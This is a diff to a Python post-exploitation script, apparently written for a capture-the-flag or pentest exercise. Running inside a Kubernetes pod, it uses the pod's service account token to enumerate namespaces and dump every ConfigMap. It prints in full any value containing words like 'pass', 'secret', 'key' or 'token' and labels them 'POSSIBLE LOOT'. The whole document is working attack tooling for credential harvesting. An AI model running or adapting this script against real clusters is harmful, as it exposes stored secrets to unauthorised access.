@@ -10,9 +10,12 @@ APISERVER = "https://kubernetes.default.svc"
 
 # === VISUALS ===
 class C:
-    G = "\033[92m"; Y = "\033[93m"; B = "\033[94m"; C = "\033[96m"; E = "\033[0m"
+    G = "\033[92m"; Y = "\033[93m"; B = "\033[94m"; C = "\033[96m"; R = "\033[91m"; E = "\033[0m"
 
 # === SETUP ===
+if not os.path.exists(TOKEN_PATH):
+    print(f"{C.R}❌ FATAL: No Service Account found.{C.E}"); sys.exit(1)
+
 with open(TOKEN_PATH) as f: TOKEN = f.read().strip()
 SSL_CTX = ssl.create_default_context(cafile=CACERT_PATH)
 
@@ -22,45 +25,64 @@ def k8s_api(path):
     try:
         with urlopen(req, context=SSL_CTX, timeout=3) as res:
             return json.loads(res.read())
-    except Exception as e: return None
+    except Exception: return None
 
-# === MAIN LOOT LOOP ===
-print(f"{C.B}=== 📄 CONFIGMAP DUMPER ==={C.E}")
+# === 1. DISCOVER NAMESPACES ===
+print(f"{C.B}=== 1. DISCOVERING NAMESPACES ==={C.E}")
+namespaces = []
 
-# We target the namespaces where you have 'list configmaps' permission
-# Based on your previous scan: internal, dev-internal
-targets = ["internal", "dev-internal", "orthanc", "wordpress"]
+# Try API listing
+resp = k8s_api("/api/v1/namespaces")
+if resp and "items" in resp:
+    namespaces = [item["metadata"]["name"] for item in resp["items"]]
+    print(f"  ✅ Found {len(namespaces)} namespaces via API.")
+else:
+    print(f"  ❌ Cannot list namespaces API. Falling back to current.")
+    try:
+        with open(os.path.join(SA_PATH, "namespace")) as f:
+            namespaces.append(f.read().strip())
+    except: pass
 
-for ns in targets:
+print(f"  Targets: {C.C}{', '.join(namespaces)}{C.E}")
+
+# === 2. LOOT CONFIGMAPS ===
+print(f"\n{C.B}=== 2. CONFIGMAP DUMPER ==={C.E}")
+
+for ns in namespaces:
     print(f"\n{C.C}📂 Namespace: {ns}{C.E}")
     
-    # 1. Try to list ConfigMaps
-    resp = k8s_api(f"/api/v1/namespaces/{ns}/configmaps")
+    # Try to list ConfigMaps in this namespace
+    cm_resp = k8s_api(f"/api/v1/namespaces/{ns}/configmaps")
     
-    if not resp or "items" not in resp:
-        print(f"  ❌ Access Denied or Empty")
+    if not cm_resp or "items" not in cm_resp:
+        print(f"  ❌ Access Denied")
         continue
 
-    print(f"  ✅ Found {len(resp['items'])} ConfigMaps")
+    count = len(cm_resp['items'])
+    if count == 0:
+        print(f"  (Empty)")
+        continue
+
+    print(f"  ✅ Found {count} ConfigMaps")
     
-    # 2. Iterate and Print Data
-    for cm in resp['items']:
+    for cm in cm_resp['items']:
         name = cm['metadata']['name']
-        # Skip boring default K8s stuff
-        if name == "kube-root-ca.crt": continue
+        if name == "kube-root-ca.crt": continue # Skip noise
         
         print(f"    📄 {C.Y}{name}{C.E}")
         
         if "data" in cm:
             for key, val in cm["data"].items():
-                # Check for interesting content
-                if any(x in val.lower() for x in ["flag", "pass", "key", "secret", "user", "admin"]):
-                    print(f"      🚨 {C.G}POSSIBLE LOOT IN '{key}':{C.E}")
+                # Heuristic: Check for secrets
+                is_sus = any(x in val.lower() or x in key.lower() for x in ["flag", "pass", "key", "secret", "user", "admin", "token"])
+                
+                if is_sus:
+                    print(f"      🚨 {C.G}POSSIBLE LOOT ({key}):{C.E}")
                     print(f"      {val}")
                 else:
-                    # Print first 100 chars just in case
-                    preview = val[:100].replace('\n', ' ')
-                    print(f"      {key}: {preview}...")
+                    preview = val[:80].replace('\n', ' ')
+                    if len(val) > 80: preview += "..."
+                    print(f"      {key}: {preview}")
         else:
             print("      (No data)")
 
